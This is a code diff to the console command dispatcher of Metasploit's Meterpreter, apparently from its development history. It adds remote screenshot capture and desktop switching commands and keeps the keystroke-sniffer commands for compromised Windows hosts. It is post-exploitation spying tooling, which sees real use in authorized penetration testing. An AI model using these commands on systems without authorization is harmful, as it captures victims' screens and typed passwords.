@@ -24,14 +24,13 @@ class Console::CommandDispatcher::Stdapi::Ui
 			"idletime"      => "Returns the number of seconds the remote user has been idle",
 			"uictl"         => "Control some of the user interface components",
 			"enumdesktops"  => "List all accessible desktops and window stations",
-			"setdesktop"    => "Move to a different workstation and desktop",
+			"getdesktop"    => "Get the current meterpreter desktop",
+			"setdesktop"    => "Change the meterpreters current desktop",
 			"keyscan_start" => "Start capturing keystrokes",
 			"keyscan_stop"  => "Stop capturing keystrokes",
 			"keyscan_dump"  => "Dump the keystroke buffer",
-			
-			# no longer needed with setdesktop
-			# "grabinputdesktop" => "Take over the active input desktop",
-			
+			"screenshot"    => "Grab a screenshot of the interactive desktop",
+
 			#  not working yet
 			# "unlockdesktop" => "Unlock or lock the workstation (must be inside winlogon.exe)",
 		}
@@ -97,36 +96,140 @@ class Console::CommandDispatcher::Stdapi::Ui
 	end
 	
 	#
-	# Hijack the input desktop
+	# Grab a screenshot of the current interactive desktop.
 	#
-	def cmd_grabinputdesktop(*args)
-		print_line("Trying to hijack the input desktop...")
-		client.ui.grab_input_desktop
+	def cmd_screenshot( *args )
+		path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
+		quality = 50
+		view    = true
+		
+		screenshot_opts = Rex::Parser::Arguments.new(
+			"-h" => [ false, "Help Banner." ],
+			"-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
+			"-p" => [ true, "The JPEG image path (Default: '#{path}')" ],
+			"-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ]
+		)
+		
+		screenshot_opts.parse( args ) { | opt, idx, val |
+			case opt
+				when "-h"
+					print_line( "Usage: screenshot [options]\n" )
+					print_line( "Grab a screenshot of the current interactive desktop." )
+					print_line( screenshot_opts.usage )
+					return
+				when "-q"
+					quality = val.to_i
+				when "-p"
+					path = val
+				when "-v"
+					view = false if ( val =~ /^(f|n|0)/i )
+			end
+		}
+		
+		data = client.ui.screenshot( quality )
+		
+		if( data )
+			::File.open( path, 'wb' ) do |fd|
+				fd.write( data )
+			end
+		
+			path = ::File.expand_path( path )
+			
+			print_line( "Screenshot saved to: #{path}" )
+			
+			Rex::Compat.open_file( path ) if view
+		end
+		
 		return true
-	end	
+	end
 	
 	#
 	# Enumerate desktops
 	#
 	def cmd_enumdesktops(*args)
-		print_line("Enumerating all accessible desktops")
-		client.ui.enum_desktops.each do |d|
-			print_line(" - #{d}")
-		end
-		return true
-	end	
-
-	#
-	# Take over a specific desktop
-	#
-	def cmd_setdesktop(*args)
-		if(args.length == 0)
-			print_line("Usage: setdesktop [workstation\\\\desktop]")
-			return
+		print_line( "Enumerating all accessible desktops" )
+		
+		desktops = client.ui.enum_desktops
+		
+		desktopstable = Rex::Ui::Text::Table.new(
+			'Header'  => "Desktops",
+			'Indent'  => 4,
+			'Columns' => [	"Session",
+							"Station",
+							"Name"
+						]
+		)
+		
+		desktops.each { | desktop |
+			session = desktop['session'] == 0xFFFFFFFF ? '' : desktop['session'].to_s
+			desktopstable << [ session, desktop['station'], desktop['name'] ]
+		}
+		
+		if( desktops.length == 0 )
+			print_line( "No accessible desktops were found." )
+		else
+			print( "\n" + desktopstable.to_s + "\n" )
 		end
 		
-		print_line("Changing to desktop #{args[0]}")
-		client.ui.set_desktop(*args)
+		return true
+	end
+
+	#
+	# Get the current meterpreter desktop.
+	#
+	def cmd_getdesktop(*args)
+		
+		desktop = client.ui.get_desktop
+		
+		session = desktop['session'] == 0xFFFFFFFF ? '' : "Session #{desktop['session'].to_s}\\"
+		
+		print_line( "#{session}#{desktop['station']}\\#{desktop['name']}" )
+		
+		return true
+	end
+	
+	#
+	# Change the meterpreters current desktop.
+	#
+	def cmd_setdesktop( *args )
+		
+		switch   = false
+		dsession = -1
+		dstation = 'WinSta0'
+		dname    = 'Default'
+		
+		setdesktop_opts = Rex::Parser::Arguments.new(
+			"-h" => [ false, "Help Banner." ],
+			#"-s" => [ true, "The session (Default: '#{dsession}')" ],
+			"-w" => [ true, "The window station (Default: '#{dstation}')" ],
+			"-n" => [ true, "The desktop name (Default: '#{dname}')" ],
+			"-i" => [ true, "Set this desktop as the interactive desktop (Default: '#{switch}')" ]
+		)
+		
+		setdesktop_opts.parse( args ) { | opt, idx, val |
+			case opt
+				when "-h"
+					print_line( "Usage: setdesktop [options]\n" )
+					print_line( "Change the meterpreters current desktop." )
+					print_line( setdesktop_opts.usage )
+					return
+				#when "-s"
+				#  dsession = val.to_i
+				when "-w"
+					dstation = val
+				when "-n"
+					dname = val
+				when "-i"
+					switch = true if ( val =~ /^(t|y|1)/i )
+			end
+		}
+		
+		if( client.ui.set_desktop( dsession, dstation, dname, switch ) )
+			print_line( "#{ switch ? 'Switched' : 'Changed' } to desktop #{dstation}\\#{dname}" )
+		else
+			print_line( "Failed to #{ switch ? 'switch' : 'change' } to desktop #{dstation}\\#{dname}" )
+		end
+		
 		return true
 	end	
 
@@ -154,7 +257,7 @@ class Console::CommandDispatcher::Stdapi::Ui
 	# Start the keyboard sniffer
 	#
 	def cmd_keyscan_start(*args)
-		print_line("Starting the keystroke sniffer...")	
+		print_line("Starting the keystroke sniffer...")
 		client.ui.keyscan_start
 		return true
 	end	
@@ -163,7 +266,7 @@ class Console::CommandDispatcher::Stdapi::Ui
 	# Stop the keyboard sniffer
 	#
 	def cmd_keyscan_stop(*args)
-		print_line("Stopping the keystroke sniffer...")		
+		print_line("Stopping the keystroke sniffer...")
 		client.ui.keyscan_stop
 		return true
 	end	
@@ -172,7 +275,7 @@ class Console::CommandDispatcher::Stdapi::Ui
 	# Dump captured keystrokes
 	#
 	def cmd_keyscan_dump(*args)
-		print_line("Dumping captured keystrokes...")			
+		print_line("Dumping captured keystrokes...")
 		data = client.ui.keyscan_dump
 		outp = ""
 		data.unpack("n*").each do |inp|
@@ -203,7 +306,7 @@ class Console::CommandDispatcher::Stdapi::Ui
 		
 		return true
 	end	
-			
+
 end
 
 end
